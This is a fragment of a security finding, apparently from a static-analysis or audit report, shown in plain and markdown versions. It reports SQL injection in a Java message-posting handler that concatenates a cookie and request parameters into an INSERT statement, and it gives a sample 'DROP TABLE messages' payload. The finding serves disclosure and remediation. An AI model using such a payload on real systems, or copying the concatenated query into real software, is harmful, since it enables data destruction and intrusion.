          "message": {
            "text": "The composeSubmit() POST handler reads three user-controlled values:\nuser — the raw value of the \"user\" cookie (any string the client sets, because the authentication check never validates the cookie value)\nsubject — the subject request parameter\nbody — the body request parameter\n\nAll three are forwarded without any sanitisation to messageDao.post(), which concatenates them directly into an INSERT statement:\n\n// MessageDAO.java (lines 58-59)\njdbcTemplate.execute(\"INSERT INTO messages(author, subject, body, timestamp) \" +\n        \"VALUES ('\" + author + \"', '\" + subject + \"', '\" + body + \"', NOW())\");\n\nAn attacker can break out of the string literals with a single-quote and inject arbitrary SQL. For example, setting body to:\nx', NOW()); DROP TABLE messages; --\n\nwould result in:\n... VALUES ('user', 'subject', 'x', NOW()); DROP TABLE messages; --', NOW())\n\nThis enables data destruction, privilege escalation (writing to the users table), or data exfiltration via time-based/error-based side channels.",
            "markdown": "The `composeSubmit()` POST handler reads three user-controlled values:\n- `user` — the raw value of the `\"user\"` cookie (any string the client sets, because the authentication check never validates the cookie value)\n- `subject` — the `subject` request parameter\n- `body` — the `body` request parameter\n\nAll three are forwarded without any sanitisation to `messageDao.post()`, which concatenates them directly into an INSERT statement:\n\n```java\n// MessageDAO.java (lines 58-59)\njdbcTemplate.execute(\"INSERT INTO messages(author, subject, body, timestamp) \" +\n        \"VALUES ('\" + author + \"', '\" + subject + \"', '\" + body + \"', NOW())\");\n```\n\nAn attacker can break out of the string literals with a single-quote and inject arbitrary SQL. For example, setting `body` to:\n```\nx', NOW()); DROP TABLE messages; --\n```\nwould result in:\n```sql\n... VALUES ('user', 'subject', 'x', NOW()); DROP TABLE messages; --', NOW())\n```\nThis enables data destruction, privilege escalation (writing to the `users` table), or data exfiltration via time-based/error-based side channels."
          },
